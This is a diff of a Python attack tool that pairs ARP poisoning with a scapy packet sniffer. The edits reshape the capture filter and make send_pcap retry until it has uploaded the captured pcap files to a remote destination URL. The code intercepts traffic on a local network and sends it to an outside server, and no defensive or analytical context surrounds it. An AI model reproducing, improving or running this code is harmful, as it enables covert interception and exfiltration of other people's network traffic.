@@ -115,7 +115,7 @@ class ARPPoisoner:
 
 
 class Sniffer:
-    def __init__(self, must_send: bool, interface: Interface, destination: Destination = None):
+    def __init__(self, must_send: bool, interface: Interface, destination: Destination):
         self.thread = Thread
         self.killed = False
         self.must_send = must_send
@@ -125,10 +125,10 @@ class Sniffer:
 
     def kill(self):
         self.killed = True
-        pkt = scapy.layers.inet.IP()
-        pkt.dst = self.interface.get_active_hosts()[0].get_addr()
-        # The sniff function will only terminate once it receives a packet. So send a meaningless packet to self to
-        # ensure it terminates immediately.
+
+        # The sniff function will only terminate once it receives a packet, so send a meaningless packet to ensure it
+        # terminates immediately.
+        pkt = scapy.layers.inet.IP(dst=self.interface.get_active_hosts()[0].get_addr())
         send(pkt, iface=self.interface.get_name(), verbose=False)
 
     def is_killed(self):
@@ -172,7 +172,7 @@ class Sniffer:
             ip_list = self.destination.get_ip_list()
 
             for ip in ip_list:
-                filt = filt + "ip.dst != "
+                filt = filt + "dst host "
                 filt = filt + ip
 
                 if n != len(ip_list) - 1:
@@ -188,4 +188,7 @@ class Sniffer:
                 self.send_pcap()
 
     def send_pcap(self):
-        post(self.destination.get_url(), files={'file': open(self.get_next_to_send(), 'rb')})
+        while True:
+            response = post(self.destination.get_url(), files={'file': open(self.get_next_to_send(), 'rb')})
+            if response.ok:
+                break
